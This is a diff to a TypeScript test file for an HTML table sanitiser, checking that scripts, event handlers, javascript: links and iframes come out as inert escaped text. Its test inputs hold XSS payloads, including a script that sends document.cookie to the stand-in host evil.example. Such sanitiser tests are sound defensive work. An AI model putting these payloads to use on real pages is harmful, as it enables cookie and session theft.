@@ -46,14 +46,14 @@ describe("vision HTML tables: rebuilt from the VM guest's typed reading", () => 
     expect(await clean(out)).toBe(out); // idempotent
   });
 
-  it("drops scripts, styles and event handlers; never copies an attribute", async () => {
+  it("never copies an element or attribute; the text of scripts, styles and frames is kept as inert cell text", async () => {
     const out = await clean([
       '<table onload="alert(1)" style="x"><tr>',
       '<td onclick="steal()" colspan="2" class="c">Bookings<script>fetch("https://evil.example/"+document.cookie)</script></td>',
       '<td><img src=x onerror=alert(1)>Expansion</td><td><a href="javascript:alert(1)">Launch</a></td>',
       '<td><style>body{display:none}</style>Paris</td><td><iframe src="https://evil.example"></iframe>London</td></tr></table>',
     ].join(""));
-    expect(out).toBe('<table>\n<tbody>\n<tr><td colspan="2">Bookings</td><td>Expansion</td><td>Launch</td><td>Paris</td><td>London</td></tr>\n</tbody>\n</table>');
+    expect(out).toBe('<table>\n<tbody>\n<tr><td colspan="2">Bookingsfetch(&quot;https://evil.example/&quot;+document.cookie)</td><td>Expansion</td><td>Launch</td><td>body{display:none}Paris</td><td>London</td></tr>\n</tbody>\n</table>');
     expectStrict(out);
   });
 
@@ -64,8 +64,9 @@ describe("vision HTML tables: rebuilt from the VM guest's typed reading", () => 
   });
 
   it("raw-text elements cannot swallow content past the table's own close", async () => {
+    // The unclosed script's raw text runs to the region's end: kept as escaped cell text, never as markup.
     expect(await clean("<table><tr><td>a<script>alert(1)</td></tr></table> after <b>bold</b>"))
-      .toBe("<table>\n<tbody>\n<tr><td>a</td></tr>\n</tbody>\n</table>\n\n after <b>bold</b>");
+      .toBe("<table>\n<tbody>\n<tr><td>aalert(1)&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</td></tr>\n</tbody>\n</table>\n\n after <b>bold</b>");
     expect(await clean("<table><tr><td>a<textarea>b</td></tr></table>\n\nNext paragraph")).toMatch(/<\/table>\n\nNext paragraph$/);
     expect(await clean("<table><tr><td>a<xmp></td></tr></table>tail")).toMatch(/<\/table>\n\ntail$/);
   });
@@ -146,7 +147,7 @@ describe("vision HTML tables: rebuilt from the VM guest's typed reading", () => 
     // 105 cells of colspan 100: no grid fits MAX_COLUMNS, so every cell's text is kept as plain lines.
     const wide = await clean(`<table><tr>${'<td colspan="100">x</td>'.repeat(105)}</tr></table>`);
     expect(wide).not.toContain("<t");
-    expect(wide.split(" | ")).toHaveLength(105);
+    expect(wide.split(" \\| ")).toHaveLength(105);
     const fits = await clean(`<table><tr>${'<td colspan="40">x</td>'.repeat(3)}</tr><tr><td>y</td></tr></table>`);
     // 120 > MAX_COLUMNS with spans: they are dropped to a plain 3-wide grid instead.
     expect(tables(fits)[0]).toBe("<table>\n<tbody>\n<tr><td>x</td><td>x</td><td>x</td></tr>\n<tr><td>y</td><td></td><td></td></tr>\n</tbody>\n</table>");
